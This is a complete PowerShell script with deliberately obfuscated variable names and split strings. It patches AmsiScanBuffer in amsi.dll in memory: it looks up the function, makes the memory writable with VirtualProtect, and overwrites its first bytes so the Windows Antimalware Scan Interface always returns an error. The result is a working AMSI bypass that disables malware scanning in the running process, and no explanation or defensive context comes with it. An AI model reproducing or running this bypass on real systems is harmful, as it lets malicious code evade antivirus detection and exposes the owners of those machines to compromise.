function Get-FunctionBaseAddress {
    Param ($MeddleEnter, $RapidGrass)
    $SilentFall = ([AppDomain]::CurrentDomain.GetAssemblies() | ? {$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $MurkySpotty = $SilentFall.GetMethods() | ? { $_.Name -eq "GetProcAddress" }
    $UsefulTacky = $MurkySpotty[0].Invoke($null, ($SilentFall.GetMethod('GetModuleHandle').Invoke($null,@($MeddleEnter)), $RapidGrass))
    return $UsefulTacky
}
function Get-DelegateType {
    Param ([Type[]] $HushedBit, [Type] $BucketCough = [Void] )
    $FewFancy = [AppDomain]::CurrentDomain.DefineDynamicAssembly((ne`w-`ob`je`ct System.Reflection.AssemblyName('ReflectedDelegate')),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
    $FewFancy.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $HushedBit).SetImplementationFlags('Runtime, Managed')
    $FewFancy.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $BucketCough, $HushedBit).SetImplementationFlags('Runtime, Managed')
    return $FewFancy.CreateType()
}
$bytes = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[IntPtr]$CloseRoom = Get-FunctionBaseAddress -MeddleEnter ("am"+"si.dll") -RapidGrass ("Amsi"+"Scan"+"Buffer")
$PorterVisit = 0
[IntPtr] $PushyVoyage = Get-FunctionBaseAddress -MeddleEnter ("kern"+"el32.dll") -RapidGrass ("Virtual"+"Protect")
$FloatKnife = Get-DelegateType -HushedBit @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) -BucketCough ([Bool])
$ObjectSticky=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($PushyVoyage, $FloatKnife)
$ObjectSticky.Invoke($CloseRoom, [uint32]5, 0x40, [ref]$PorterVisit)
[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $CloseRoom, 6)

